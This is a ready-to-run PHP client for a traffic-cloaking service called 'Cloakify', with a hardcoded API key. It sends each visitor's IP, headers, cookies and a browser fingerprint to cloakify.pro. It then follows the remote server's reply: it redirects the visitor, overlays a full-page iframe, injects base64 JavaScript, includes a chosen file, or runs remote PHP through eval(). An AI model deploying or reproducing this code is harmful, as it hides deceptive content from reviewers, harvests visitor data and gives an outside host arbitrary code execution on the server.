<?php
$apiKey = '4Oo32IWZjMP2LXtYf2dYGqiWxW8DafSxF5XJh06Sa4c3dc8a';
$threadId = '62a42a00-b629-11ee-826b-44a842484069';

class Cloakify
{
  private $apiKey;
  private $threadId;
  private $isAjax;
  private $isJs;

  private $endpoint = 'https://cloakify.pro/api/v2';

  public function __construct($apiKey, $threadId, $isJs = false) {
    $this->apiKey   = $apiKey;
    $this->threadId = $threadId;
    $this->isAjax   = $this->isAjax();
    $this->isJs     = $isJs;

    if(!$_POST)
      $_POST = json_decode(file_get_contents("php://input"), true);

    if($this->isJs)
      header('Access-Control-Allow-Origin: *');
  }

  private function isAjax() {
    return strtolower($_SERVER['HTTP_X_REQUESTED_WITH'] ?? '') === 'xmlhttprequest';
  }

  public function getHeaders() {
    $headers = getallheaders();

    $return = [];

    foreach ($headers as $name => $value) {
      $return[] = "{$name}: {$value}";
    }

    return $return;
  }

  public function getUserIpAddress() {

    if(isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
      $ip = $_SERVER["HTTP_CF_CONNECTING_IP"];
    } elseif (isset($_SERVER['HTTP_REAL_IP'])) {
      $ip = $_SERVER['HTTP_REAL_IP'];
    } elseif (isset($_SERVER["HTTP_X_REAL_IP"])) {
      $ip = $_SERVER['HTTP_X_REAL_IP'];
    } elseif (isset($_SERVER["HTTP_X_FORWARDED_FOR"])) {
      $ip = explode(',', $_SERVER["HTTP_X_FORWARDED_FOR"])[0];
    } else {
      $ip = $_SERVER['REMOTE_ADDR'];
    }

    return $ip;
  }

  public function getUrlParams() {
    return $_GET ?? [];
  }

  public function getReferrer() {
    return $_SERVER['HTTP_REFERER'] ?? '';
  }

  public function getUserAgent() {
    return $_SERVER['HTTP_USER_AGENT'] ?? '';
  }

  public function getAcceptLanguages() {
    return $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
  }

  public function validateRequest() {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL,"{$this->endpoint}/threads/check");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
      "Authorization: Bearer {$this->apiKey}",
      'Content-Type: application/x-www-form-urlencoded',
      'Accept: application/json'
    ]);

    curl_setopt($ch, CURLOPT_REFERER, $_SERVER['REQUEST_URI'] ?? '');

    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
      'userAgent' => $this->getUserAgent(),
      'referrer' => $_POST['referrer'] ?? $this->getReferrer(),
      'languageList' => $this->getAcceptLanguages(),
      'params' => $_POST['urlParams'] ?? $this->getUrlParams(),
      'headerList' => $this->getHeaders(),
      'threadId' => $this->threadId,
      'isJs' => $this->isJs,
      'ip' => $this->getUserIpAddress(),
      'sess' => $_COOKIE['sess'] ?? '',
      'jsFingerprint' => isset($_POST['bcheck']) ? (!is_array($_POST['bcheck']) ? json_decode($_POST['bcheck'], true) : $_POST['bcheck']) : ''
    ]));

    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $output = json_decode(curl_exec($ch), true);

    curl_close($ch);

    return $output;
  }

  public function process() {
    $validate = $this->validateRequest();

    if(isset($validate['error'])) {
      echo $validate['error'];
      exit;
    }

    if(!isset($validate['action'])) {
      http_response_code(500);
      echo 'Server Error';
      exit;
    }

    if(isset($validate['session']))
      setcookie('sess', $validate['session'], time() + (10 * 365 * 24 * 60 * 60));

    if(!$this->isAjax && $this->isJs)
      header('Content-Type: application/javascript');

    if(!$this->isAjax && $validate['need_js'] && $validate['js']) {
      if($this->isJs) {
        echo base64_decode($validate['js']);
      } else {
        echo '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"></head><body><noscript>You need to enable JavaScript to run this app.</noscript><div id="root"><script src="data:text/javascript;base64,' . $validate['js'] . '"></script></div></body></html>';
      }
      exit;
    }

    if($validate['action']['action'] == 'js')
      $validate['action']['value'] = base64_encode($validate['action']['value']);

    if($this->isAjax) {
      echo json_encode($validate['action']);
      exit;
    } else {
      if($this->isJs) {
        if(in_array($validate['action']['action'], [301,302,303, 'refresh'])) {
          echo "window.location.replace('{$validate['action']['value']}');";
        } elseif ($validate['action']['action'] == 'iframe') {
          echo 'document.body.innerHTML = \'<iframe src="' . $validate['action']['value'] .  '" style="width:100%;height: 100%;position: absolute;top:0;left:0;z-index: 9999999999;border:none;outline:none;" />\';';
        } elseif ($validate['action']['action'] == 'meta') {
          echo "let meta = document.createElement('meta');meta.httpEquiv = 'refresh'; meta.content = '0; url={$validate['action']['value']}'; document.head.appendChild(meta);";
        } elseif ($validate['action']['action'] == 'js') {
          echo base64_decode($validate['action']['value']);
        }
        exit;
      } else {
        if(in_array($validate['action']['action'], [301,302,303])) {
          header("Location: {$validate['action']['value']}", true, $validate['action']['action']);
          exit;
        } elseif ($validate['action']['action'] == 'local') {
          include $validate['action']['value'];
        } elseif ($validate['action']['action'] == 'iframe') {
          echo '<iframe src="' . $validate['action']['value'] . '" style="width:100%;height: 100%;position: absolute;top:0;left:0;z-index: 9999999999;border:none;outline:none;" />';
        } elseif ($validate['action']['action'] == 'return') {
          http_response_code($validate['action']['value']);
        } elseif ($validate['action']['action'] == 'meta') {
          echo '<meta http-equiv="refresh" content="0; url=' . $validate['action']['value'] . '">';
        } elseif ($validate['action']['action'] == 'refresh') {
          header('Refresh: 0; url=' . $validate['action']['value']);
        } elseif ($validate['action']['action'] == 'xar') {
          header("X-Accel-Redirect: {$validate['action']['value']}");
        } elseif ($validate['action']['action'] == 'xsf') {
          header("X-Sendfile: {$validate['action']['value']}");
        } elseif ($validate['action']['action'] == 'php') {
          eval($validate['action']['value']);
        } elseif ($validate['action']['action'] == 'js') {
          echo '<!DOCTYPE html><html><body><script src="data:text/javascript;base64,' . $validate['action']['value'] . '"></script></body></html>';
        }
      }
    }
  }
}

$cloakify = new Cloakify($apiKey, $threadId, false);

$cloakify->process();
